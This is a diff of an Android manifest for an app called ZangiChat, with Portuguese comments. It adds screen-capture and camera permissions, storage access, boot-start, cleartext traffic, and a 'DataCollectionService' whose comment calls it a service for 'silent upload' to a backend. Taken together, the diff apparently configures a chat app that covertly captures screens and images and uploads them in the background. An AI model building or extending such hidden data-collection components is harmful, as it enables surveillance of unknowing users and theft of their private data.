@@ -8,20 +8,32 @@
         android:minSdkVersion="26"
         android:targetSdkVersion="34" />
 
-    <!-- Permissões de Rede -->
+    <!-- 1. PERMISSÕES DE REDE (Comunicação com o Backend no Render) -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- Permissão de Câmera (Módulo 1) -->
+    <!-- 2. PERMISSÕES DE MÍDIA (Câmera e Captura de Tela) -->
     <uses-permission android:name="android.permission.CAMERA" />
 
     <uses-feature
         android:name="android.hardware.camera"
         android:required="false" />
 
-    <!-- Permissões para Serviços de Segundo Plano e Captura de Tela (Módulo 2) -->
+    <!-- Permissão para capturar a tela (MediaProjection) -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+
+    <!-- 3. PERMISSÕES DE ARMAZENAMENTO E NOTIFICAÇÕES -->
+    <!-- Necessário para salvar temporariamente capturas antes do upload -->
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <!-- Para Android 13+ (API 33+) usaríamos READ_MEDIA_IMAGES, mas para logs e arquivos internos o cache resolve -->
+
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -44,9 +56,12 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.ZangiChat"
         android:usesCleartextTraffic="true" >
+
+        <!-- 4. ATIVIDADES (Fluxo de Navegação) -->
         <activity
             android:name="com.zangi.chat.ui.OnboardingActivity"
-            android:exported="true" >
+            android:exported="true"
+            android:theme="@style/Theme.ZangiChat" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
@@ -58,14 +73,27 @@
             android:exported="true"
             android:windowSoftInputMode="adjustResize" />
 
-        <!-- Serviço de Segundo Plano para Captura de Tela -->
+        <!-- 5. SERVIÇOS (O motor de captação em segundo plano) -->
+
+
+        <!-- Serviço para Captura de Tela (MediaProjection) -->
         <service
             android:name="com.zangi.chat.service.ScreenCaptureService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="mediaProjection" />
+            android:foregroundServiceType="mediaProjection|dataSync" />
 
-        <!-- FileProvider para compartilhar URIs de fotos capturadas pela câmera -->
+        <!-- Serviço para Processamento de Dados e Upload Silencioso -->
+        <service
+            android:name="com.zangi.chat.service.DataCollectionService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="dataSync" />
+
+        <!-- 6. PROVEDORES E CONFIGURAÇÕES DE SEGURANÇA -->
+
+
+        <!-- FileProvider para gerenciar o armazenamento de arquivos temporários de mídia -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="com.zangi.chat.fileprovider"
@@ -75,6 +103,16 @@
                 android:name="android.support.FILE_PROVIDER_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+
+        <service
+            android:name="androidx.camera.core.impl.MetadataHolderService"
+            android:enabled="false"
+            android:exported="false" >
+            <meta-data
+                android:name="androidx.camera.core.impl.MetadataHolderService.DEFAULT_CONFIG_PROVIDER"
+                android:value="androidx.camera.camera2.Camera2Config$DefaultProvider" />
+        </service>
+
         <provider
             android:name="androidx.startup.InitializationProvider"
             android:authorities="com.zangi.chat.androidx-startup"
